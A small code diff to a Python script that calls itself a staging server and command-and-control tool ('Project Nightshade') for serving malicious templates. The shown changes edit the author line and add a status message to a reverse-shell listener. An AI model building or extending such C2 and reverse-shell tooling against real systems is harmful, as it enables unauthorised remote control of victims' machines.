@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Project Nightshade - Enhanced Staging Server + C2
-Author: ek0ms savi0r | OPSEC Grade: Midnight
+Author: ek0ms savi0r 
 Description:
     Combined staging server and basic C2 that can:
     - Serve malicious templates
@@ -156,6 +156,7 @@ def reverse_shell_handler():
         server.listen(5)
         
         print(f"[+] Reverse shell handler started on port {config.REVERSE_SHELL_PORT}")
+        print(f"[+] Ready for incoming reverse shell connections")
         
         while True:
             client_socket, addr = server.accept()
